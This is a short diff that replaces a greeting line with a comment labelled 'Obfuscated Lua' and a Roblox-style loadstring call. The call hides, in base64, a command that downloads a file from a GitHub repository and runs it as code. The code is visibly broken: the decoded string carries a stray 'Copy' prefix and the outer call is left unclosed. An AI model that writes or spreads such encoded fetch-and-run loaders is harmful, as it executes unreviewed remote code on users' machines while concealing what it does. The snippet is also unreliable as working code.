@@ -1,1 +1,2 @@
-hi guys
+-- Obfuscated Lua
+loadstring(game:HttpGet('data:text/plain;base64,Q29weWxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV0hJVEUtSEFUOTk5L1NlcnZlckhvcHBlci9yZWZzL2hlYWRzL21haW4vUkVBRE1FLm1kIikpKCk='))(
